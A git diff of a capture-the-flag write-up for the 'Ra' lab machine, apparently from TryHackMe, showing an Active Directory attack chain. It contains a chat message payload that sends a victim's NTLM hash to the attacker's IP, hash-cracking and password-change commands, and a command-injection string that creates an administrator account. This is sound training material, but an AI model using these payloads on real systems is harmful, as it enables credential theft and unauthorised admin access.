@@ -1,7 +1,7 @@
 
 # Ra
 
-![[attachments/Pasted image 20240613140545.png]]
+![](attachments/20240613140545.png)
 
 
 **Story**
@@ -631,17 +631,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Add the entry to the `/etc/hosts` file
 
-![[attachments/Pasted image 20240613140020.png]]
+![](attachments/20240613140020.png)
 
 # Web Enumeration
 
 Website running on port 80
 
-![[attachments/Pasted image 20240613140200.png]]
+![](attachments/20240613140200.png)
 
 using burpsuite we can see a request being made to the endpoint `fire.windcorp.thm:9090` and there are also various emails disclosed
 
-![[attachments/Pasted image 20240613142013.png]]
+![](attachments/20240613142013.png)
 
 Extracted the emails and usernames, it could be useful later
 
@@ -688,27 +688,27 @@ orangegorilla428
 
 Navigating to the url `http://fire.windcorp.thm:9090` takes us to an openfire administration console
 
-![[attachments/Pasted image 20240613142351.png]]
+![](attachments/20240613142351.png)
 
 Tried using an exploit to gain admin access but it didn't work
 
-![[attachments/Pasted image 20240613144943.png]]
+![](attachments/20240613144943.png)
 
-![[attachments/Pasted image 20240613145034.png]]
+![](attachments/20240613145034.png)
 
 Going back to the domain `windcorp.thm` we  have a couple things 
 
 List of IT support-staff (Full Names)
 
-![[attachments/Pasted image 20240613150036.png]]
+![](attachments/20240613150036.png)
 
 Employees in focus shows some more employee full names
 
-![[attachments/Pasted image 20240613150141.png]]
+![](attachments/20240613150141.png)
 
 The middle one might be a hint or not because in the password reset functionality there is a security question for pet's name.
 
-![[attachments/Pasted image 20240613150244.png]]
+![](attachments/20240613150244.png)
 
 So if we are able to get her pet's name somehow we can maybe reset the password.
 
@@ -722,7 +722,7 @@ Port 445 is running so we can perform SMB enumeration with a variety of tools.
 
 Kerbrute is a tool used to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
 
-![[attachments/Pasted image 20240613151134.png]]
+![](attachments/20240613151134.png)
 
 ```shell
 ./kerbrute userenum -d windcorp.thm usernames.txt --dc 10.10.103.148
@@ -734,7 +734,7 @@ with the usernames obtained earlier we can see 13 valid usernames
 
 After getting valid user accounts, the common thing to do is to perform `AS-REP Roasting` using the tool `GetNPUsers`
 
-![[attachments/Pasted image 20240613151814.png]]
+![](attachments/20240613151814.png)
 
 No luck here. None of the accounts are ASReproastable
 
@@ -744,19 +744,19 @@ After much searching i couldn't find anything good so i decided to take a step b
 
 Going back to the main page and taking more time to inspect it, i discovered something interesting
 
-![[attachments/Pasted image 20240613155541.png]]
+![](attachments/20240613155541.png)
 
 The name of the image is `lilyleAndSparky`. That is most probably the user's username and pet name.
 
 Trying to reset the password with this new info
 
-![[attachments/Pasted image 20240613155829.png]]
+![](attachments/20240613155829.png)
 
 Success
 
 Login on the openfire admin console
 
-![[attachments/Pasted image 20240613155913.png]]
+![](attachments/20240613155913.png)
 
 It didn't work.
 
@@ -766,45 +766,160 @@ So i tried enumerating with smb instead.
 
 Using smbclient
 
-![[attachments/Pasted image 20240613160342.png]]
+![](attachments/20240613160342.png)
 
 It works
 
 Using smbmap we can see the share permissions
 
-![[attachments/Pasted image 20240613160528.png]]
+![](attachments/20240613160528.png)
 
 Adding the -r flag allows us to see sub directories for each share, and in the `Shared` share we can find the first flag
 
-![[attachments/Pasted image 20240613161237.png]]
+![](attachments/20240613161237.png)
 
 add the `--download PATH` to the command to download the flag
 
-![[attachments/Pasted image 20240613161401.png]]
+![](attachments/20240613161401.png)
 
 # User Enumeration
 
 With the credential obtained we can enumerate even more usernames with netexec
 
-![[attachments/Pasted image 20240613165108.png]]
+![](attachments/20240613165108.png)
 
 There are way too many users (3999)
 
-![[attachments/Pasted image 20240613165146.png]]
+![](attachments/20240613165146.png)
 
 We can output the result into a file and extract the usernames  to maybe use for attacks later.
 
 Checking the share `Shared`, we can see the spark version in use on the machine
 
-![[attachments/Pasted image 20240614095855.png]]
+![](attachments/20240614095855.png)
+
+# CVE-2020-12772
 
 Checking online for an exploit
 
 we find a github repo that contains info on the exploit and we can see the creator of the room was part of this finding
 
-![[attachments/Pasted image 20240614100350.png]]
+![](attachments/20240614100350.png)
 
 Download the debian package and install, if you are using debian based Linux distro of course
 
 
-![[attachments/Pasted image 20240614154819.png]]
+I had so much issues installing the spark debian package and it didn't work because of dependencies.
+
+So i had to run the command
+
+```shell
+sudo dpkg -i --ignore-depends=openjdk-8-jre,oracle-java8-jre spark_2_8_3.deb
+```
+
+After installing make sure to go to Advanced and select these 2 options
+
+![](attachments/20240621104458.png)
+
+then login using lilyle's creds
+
+In the exploit on github, the target was `buse@fire.windcorp.thm` so we can search for this user and try the exploit against them
+
+![](attachments/20240621104844.png)
+
+
+Start responder on your vpn interface
+
+![](attachments/20240621105218.png)
+
+Send a message to the user with the payload
+
+```javascript
+ <img src="http://IP/test.img">
+```
+![](attachments/20240621105334.png)
+
+Responder will capture the hash
+
+![](attachments/20240621105247.png)
+
+
+Copy and paste the hash in a file and crack using hashcat 
+
+```shell
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+![](attachments/20240621105701.png)
+
+Login using evil-winrm and the obtained credentials
+
+![](attachments/20240621110249.png)
+
+Second flag obtained
+
+![](attachments/20240621110418.png)
+
+# Privilege Escalation
+
+Checking the contents of all files and folders doesn't show anything useful.
+
+Also checking privileges yields nothing useful.
+
+Checking the C:\\scripts directory, we can see a powershell script and a log file
+
+![](attachments/20240621124541.png)
+
+The script seems to be making use of this hosts.txt file
+
+![](attachments/20240621125018.png)
+
+We don't have access to view the file.
+
+![](attachments/20240621125054.png)
+
+If we had access to this file, we could inject commands to create a new user since it'll run as Administrator.
+
+It is also important to note that the our current user `buse` is part of **Account Operators** group
+
+![](attachments/20240621125923.png)
+
+Which gives the permission to add users.
+
+Also we are able to change the password of the user brittanycr because the user buse is part of the Operators Group.
+
+```powershell
+net user brittanycr 'Password123#' /domain
+```
+
+![](attachments/20240621130256.png)
+
+Login to the smb share `Users` as the user `brittanycr`
+
+![](attachments/20240621130434.png)
+
+Access the directory and get the hosts.txt file or just create a new file named hosts.txt on your machine
+
+insert the contents 
+
+![](attachments/20240621152743.png)
+
+```powershell
+;net user /add deusx Password123; net localgroup administrators deusx /add
+```
+
+This will create a new user named `deusx` with the password and add them to the administrators group
+
+After that replace the file (make sure to delete the existing file using `del hosts.txt`)
+
+![](attachments/20240621130924.png)
+
+We can then login via evil-winrm as the new user
+
+![](attachments/20240621152925.png)
+
+Obtain the final flag
+
+![](attachments/20240621153319.png)
+
+GGs 
